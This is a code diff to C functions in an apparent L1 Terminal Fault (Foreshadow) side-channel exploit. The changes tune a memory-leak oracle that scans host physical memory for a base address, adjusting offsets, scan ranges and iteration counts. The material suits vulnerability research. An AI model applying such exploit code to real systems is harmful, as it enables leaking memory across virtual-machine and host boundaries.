@@ -638,7 +638,7 @@ void l1tf_test(void *va, uintptr_t pa, int iters)
 void l1tf_test_base(uintptr_t pa, int iters)
 {
   uint64_t t_start = clock_read();
-  int hits = l1tf_oracle16(0xffff, pa, iters, NULL);
+  int hits = l1tf_oracle16(0xffff, pa+6, iters, NULL);
   double time = (clock_read()-t_start)/1000000000.0;
   printf("l1tf_test_base: hits %6d (%4.1f%%) | hits/sec %6.1f K | iters/sec %6.1f K\n",
       hits, 100.0*hits/iters, hits/time/1000, iters/time/1000);
@@ -704,8 +704,8 @@ uintptr_t l1tf_find_base(void)
   uint64_t t_start = clock_read();
 
   for (int run = 0; run < 10000; run++) {
-    // uintptr_t start = 0; uintptr_t end = HOST_MEMORY_SIZE;
-    uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
+    uintptr_t start = 0x218; uintptr_t end = HOST_MEMORY_SIZE;
+    // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
     for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
       if (verbose >= 2) if (pa % (16*1024*1024) == (start & 0xfff)) {
         printf("l1tf_find_base: run %3d  |  pa  %12lx", run, pa);
@@ -715,12 +715,12 @@ uintptr_t l1tf_find_base(void)
 
       int off;
       for (off = 0; off < 16; off += 8) {
-        int hits = l1tf_oracle16(0xffff, pa+off, 100+off*1000, NULL);
+        int hits = l1tf_oracle16(0xffff, pa+6+off, 3+off*1000, NULL);
         if (!hits)
           break;
         if (verbose >= 1) printf("l1tf_find_base: run %3d  | pa %12lx  |  hits %4d\n", run, pa+off, hits);
       }
-      if (off == 8) {
+      if (off >= 16) {
         if (verbose >= 1) {
           double time = (clock_read()-t_start)/1000000000.0;
           uintptr_t len = (pa-start) + run*(end-start);
